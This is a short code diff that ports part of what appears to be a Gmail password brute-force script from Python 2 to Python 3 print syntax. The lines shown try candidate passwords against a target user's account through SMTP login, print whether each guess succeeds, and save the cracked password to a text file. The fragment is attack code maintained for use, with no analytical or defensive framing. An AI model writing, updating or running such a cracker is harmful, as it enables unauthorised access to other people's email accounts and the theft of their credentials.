@@ -33,11 +33,11 @@ def gmail():
 	    try:
 		    smtpserver.login(user, password)
 
-		    print ""+G+"[+] "+W+"Password Found: %s" % password
-		    print ""+G+"[*] Saved output to GmailPassword.txt"
+		    print (""+G+"[+] "+W+"Password Found: %s" % password)
+		    print (""+G+"[*] Saved output to GmailPassword.txt")
 		    break;
 	    except smtplib.SMTPAuthenticationError:
-		    print ""+R+"[!] "+W+"Password Incorrect: %s" % password
+		    print (""+R+"[!] "+W+"Password Incorrect: %s" % password)
     FILE = open("GmailPassword.txt","w+")
     FILE.write('Password for ' + user + ' is: ' + password)
     FILE.close()
